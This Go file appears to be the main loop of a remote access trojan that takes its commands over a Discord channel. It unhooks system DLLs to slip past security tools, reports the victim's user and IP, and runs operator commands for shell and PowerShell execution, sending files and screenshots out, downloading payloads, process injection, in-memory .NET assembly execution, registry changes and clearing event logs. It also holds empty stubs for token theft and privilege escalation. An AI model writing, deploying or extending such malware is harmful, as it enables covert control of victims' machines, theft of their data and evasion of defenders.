package main

import (
	"fmt"
	"os"
	"os/user"
	"strconv"
	"strings"

	"github.com/kensh1ro/willie/adminutils"
	"github.com/kensh1ro/willie/clr"
	"github.com/kensh1ro/willie/config"
	"github.com/kensh1ro/willie/discordapi"
	"github.com/kensh1ro/willie/fsutils"
	"github.com/kensh1ro/willie/netutils"
	"github.com/kensh1ro/willie/psutils"
	reg "github.com/kensh1ro/willie/registery"
	"github.com/kensh1ro/willie/scanutils"
	"github.com/kensh1ro/willie/screen"
	"github.com/kensh1ro/willie/sysutils"
)

func sendMessage(text string) {
	j := 0
	if len(text) <= config.MESSAGE_LIMIT {
		discordapi.SendMessage(config.CHANNEL_ID, text)
	} else {
		for i := 0; i < len(text); i++ {
			if i%config.MESSAGE_LIMIT == 0 {
				fmt.Println(text[j:i])
				discordapi.SendMessage(config.CHANNEL_ID, text[j:i])
				j = i
			}
		}
	}
}

func main() {
	if sysutils.CheckMutex() {
		os.Exit(-1)
	}
	sysutils.UnhookDLL(config.Decrypt(config.KERNEL32))
	sysutils.UnhookDLL(config.Decrypt(config.KERNELBASE))
	sysutils.UnhookDLL(config.Decrypt(config.NTDLL))
	user, _ := user.Current()
	username := user.Username + " Connected!"
	pq := discordapi.New()
	sendMessage(username + "\nIP: " + netutils.PrivateIP())
	go pq.Run()
	for {
		if len(pq.Q) > 0 {
			content := pq.Q.Pop()
			//fmt.Print("CONTENT: ")
			//fmt.Println(content)
			var command = strings.SplitN(content.(string), " ", 2)
			switch command[0] {
			case "!help":
				out := config.Decrypt(config.HELP)
				go sendMessage(out)

			case "!powershell":
				if !(len(command) > 1) {
					sendMessage("Usage: !powershell <args..>")
					break
				}
				go sendMessage(adminutils.Powershell(command[1]))
			case "!shell":
				if !(len(command) > 1) {
					sendMessage("Usage: !shell <args..>")
					break
				}
				go sendMessage(adminutils.Cmd(command[1]))
			case "!wmic":
				if !(len(command) > 1) {
					sendMessage("Usage: !wmic <args..>")
					break
				}
				go sendMessage(adminutils.WMI(command[1]))
			case "!cd":
				if !(len(command) > 1) {
					sendMessage("Usage: !cd <path>")
					break
				}
				err := fsutils.Cd(command[1])
				if err != nil {
					sendMessage(err.Error())
				}
			case "!ls":
				if !(len(command) > 1) {
					go sendMessage(fsutils.ListDir("."))
				} else {
					go sendMessage(fsutils.ListDir(command[1]))
				}
			case "!drives":
				go sendMessage(fsutils.ListDrives())
			case "!scan":
				params := strings.Split(command[1], " ")
				if len(params) < 3 {
					sendMessage("Usage: !scan <host> <ports> <protocol>")
				} else {
					go sendMessage(scanutils.RunScan(params[0], params[1], params[2]))
				}
			case "!screenshot":
				go discordapi.SendFile(config.CHANNEL_ID, "image.png", screen.ScreenShot())
			case "!download":
				if !(len(command) > 1) {
					sendMessage("Usage: !download <file_path>")
					break
				}
				data, err := os.ReadFile(command[1])
				if err != nil {
					sendMessage(err.Error())
				}
				go discordapi.SendFile(config.CHANNEL_ID, command[1], data)
			case "!url":
				if !(len(command) > 1) {
					sendMessage("Usage: !url <file_path> <url>")
					break
				}
				params := strings.Split(command[1], " ")
				if len(params) < 2 {
					sendMessage("Usage: !url <file_path> <url>")
					break
				}
				err := netutils.DownloadURL(params[0], params[1])
				if err != nil {
					sendMessage(err.Error())
					break
				}
				sendMessage("File downloaded successfully!")

			case "!getpid":
				go sendMessage(strconv.Itoa(os.Getpid()))

			case "!inject":
				if (discordapi.FileAttachment != discordapi.Attachment{}) {
					data, err := netutils.GetUrlBytes(discordapi.FileAttachment.URL)
					if err != nil {
						sendMessage(err.Error())
						break
					}
					if !(len(command) == 1) {
						sendMessage(sysutils.InjectionHandler(command[1], data))
					} else {
						sendMessage(sysutils.InjectionHandler("", data))
					}
				} else {
					sendMessage("Specify a file")
				}
			case "!clr":
				if (discordapi.FileAttachment != discordapi.Attachment{}) {
					data, err := netutils.GetUrlBytes(discordapi.FileAttachment.URL)
					if err != nil {
						sendMessage(err.Error())
						break
					}
					if len(command) > 1 {
						params := strings.Split(command[1], " ")
						go sendMessage(clr.ExecuteAssembly("v4", data, params))
					} else {
						go sendMessage(clr.ExecuteAssembly("v4", data, []string{}))
					}
				} else {
					sendMessage("Specify a file")
				}
			case "!upload":
				if (discordapi.FileAttachment != discordapi.Attachment{}) {
					err := netutils.DownloadURL(discordapi.FileAttachment.Filename, discordapi.FileAttachment.URL)
					if err != nil {
						go sendMessage(err.Error())
						break
					}
					sendMessage("File downloaded successfully!")
				} else {
					sendMessage("Specify a file")
				}
			case "!idle":
				go sendMessage(sysutils.Uptime())
			case "!kill":
				if !(len(command) > 1) {
					sendMessage("Usage: !kill <pid>")
					break
				}
				pid, err := strconv.Atoi(command[1])
				if err != nil {
					sendMessage(err.Error())
					break
				}
				err = psutils.Kill(pid)
				if err != nil {
					sendMessage(err.Error())
				}
			case "!ps":
				go sendMessage(psutils.PS())
			case "!reg":
				if !(len(command) > 1) {
					sendMessage("Usage: !reg params...")
					break
				}
				go sendMessage(reg.RegHandler(command[1]))
			case "!clearev":
				go sendMessage(sysutils.ClearEv())
			case "!ifconfig":
				result, err := netutils.Ipconfig()
				if err != nil {
					sendMessage(err.Error())
				} else {
					sendMessage(result)
				}
			case "!pwd":
				go sendMessage(fsutils.Pwd())
			case "!rm":
				if !(len(command) > 1) {
					sendMessage("Usage: !rm <path>")
					break
				}
				err := fsutils.Rm(command[1])
				if err != nil {
					sendMessage(err.Error())
				}
			case "!getuid":

			case "!rev2self":

			case "!steal_token":

			case "!getsystem":

			}
		}
	}
}
